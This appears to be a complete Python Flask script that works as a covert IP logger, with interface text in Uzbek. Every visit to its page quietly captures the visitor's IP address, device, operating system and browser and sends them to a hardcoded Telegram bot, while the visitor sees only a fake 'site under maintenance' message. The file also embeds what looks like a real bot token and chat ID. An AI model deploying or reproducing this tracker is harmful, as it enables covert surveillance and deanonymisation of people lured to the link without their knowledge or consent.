from flask import Flask, request, render_template_string
import requests
from user_agents import parse

app = Flask(__name__)

TELEGRAM_TOKEN = "8613097954:AAG_Fl4pX3KXVSLBYZGQm4M15PwXwmhYL7s"
CHAT_ID = "7794276843"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)

@app.route('/')
def index():
    ip_addr = request.remote_addr
    user_agent_str = request.headers.get('User-Agent')
    user_agent = parse(user_agent_str)
    
    device = "Kompyuter" if user_agent.is_pc else "Mobil qurilma"
    if user_agent.is_tablet:
        device = "Planshet"

    message = (
        "<b>🚀 Yangi foydalanuvchi aniqlandi!</b>\n\n"
        f"<b>🌐 IP Manzil:</b> <code>{ip_addr}</code>\n"
        f"<b>📱 Qurilma:</b> {device} ({user_agent.device.family})\n"
        f"<b>💻 Operatsion tizim:</b> {user_agent.os.family} {user_agent.os.version_string}\n"
        f"<b>🌍 Brauzer:</b> {user_agent.browser.family} {user_agent.browser.version_string}\n"
        f"<b>🕵️ User-Agent:</b> <code>{user_agent_str}</code>"
    )
    
    send_to_telegram(message)
    
    return "<h1>Sayt texnik ishlarni amalga oshirmoqda...</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)




